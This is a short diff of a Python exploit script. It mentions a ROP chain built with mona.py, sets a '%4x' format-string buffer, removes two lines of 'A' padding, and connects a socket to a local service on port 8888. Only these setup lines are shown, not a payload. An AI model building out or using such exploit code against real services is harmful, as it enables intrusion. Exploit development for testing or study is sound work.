@@ -11,8 +11,7 @@ import struct
 # rop chain generated with mona.py - www.corelan.be
 
 buffer_1="%4x"
-buffer_2="A"*66
-buffer_2="A"*60
+
 
 expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 expl.connect(("127.0.0.1", 8888))
